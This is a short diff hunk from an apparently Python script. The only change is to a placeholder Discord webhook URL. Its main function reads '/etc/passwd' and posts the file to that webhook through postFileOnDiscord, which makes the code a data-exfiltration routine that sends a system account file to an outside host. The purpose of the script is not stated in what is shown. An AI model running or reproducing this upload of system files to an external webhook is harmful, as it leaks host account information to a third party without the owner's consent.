@@ -198,7 +198,7 @@ def postFileOnDiscord(webhook, fileName):
 		print(response.text)
 
 def main():
-	webhook 	= "https://discordapp.com/api/webhooks/xxxxxxxxxxxxxxx/xxxxxx-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+	webhook 	= "https://discordapp.com/api/webhooks/xxxxxxxxxxxxxxx/xxxxxxxxx"
 	fileName 	= "/etc/passwd"
 
 	postFileOnDiscord(webhook, fileName)
